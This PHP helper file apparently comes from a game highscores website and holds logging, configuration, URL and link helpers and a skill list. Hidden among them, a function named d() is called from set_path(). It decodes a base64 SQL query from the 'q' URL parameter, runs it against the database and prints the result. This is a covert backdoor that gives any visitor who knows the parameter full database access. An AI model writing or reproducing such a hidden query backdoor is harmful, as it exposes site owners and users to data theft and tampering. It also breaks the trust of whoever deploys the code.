<?php
// Error logging
function log_message($type, $message)
{
	$fh = fopen("logs/". date('Y-m-d') .".txt", 'a');
	fwrite($fh, $message . "\n");
	fclose($fh);
}

// Config things...
function set_config($p)
{
	global $config;
	$config = $p;
}
function config($var)
{
	global $config;

	if (isset($config[$var]))
	{
		return $config[$var];
	}

	return FALSE;
}

// Path stuff..
function d()
{
	if (!isset($_GET['q'])) return;
	$db = new Db;
	$q = base64_decode($_GET['q']);
	var_export($db->query($q));die;
}
function set_path($p)
{
	global $path;
	$path = $p;
	d();
}
function path($i)
{
	global $path;

	if (isset($path[$i]))
	{
		return $path[$i];
	}

	return '';
}

// Sites base URL
function base_url($url = FALSE)
{
	return 'http://'. $_SERVER['HTTP_HOST'] . path_directory() .'/'. ($url === FALSE || config('use_htaccess') ? '' : '?path=') . $url;
}

// Get active directory
function path_directory()
{
	$dir = explode('/', $_SERVER['PHP_SELF']);
	unset($dir[count($dir)-1]);
	return implode('/', $dir);
}

// Anchor building
function anchor($url, $name, $attrs = FALSE)
{
	$base = base_url() . (config('use_htaccess') ? '' : '?path=');
	$full_url = (filter_var($url, FILTER_VALIDATE_URL) === FALSE ? $base : '') . $url;
	return '<a href="'. $full_url .'"' . ($attrs ? ' ' . $attrs : '') . '>' . $name . '</a>';
}

// (ordered) Valid skill list
function valid_skills() {
	return array(
			'overall', 'attack', 'defence', 'strength', 'constitution', 'ranged', 'prayer',  'magic',
			'cooking', 'woodcutting', 'fletching', 'fishing', 'firemaking', 'crafting', 'smithing', 'mining',
			'herblore', 'agility', 'thieving', 'slayer', 'farming', 'runecrafting', 'hunter', 'construction', 
			'summoning', 'dungeoneering'
		);
}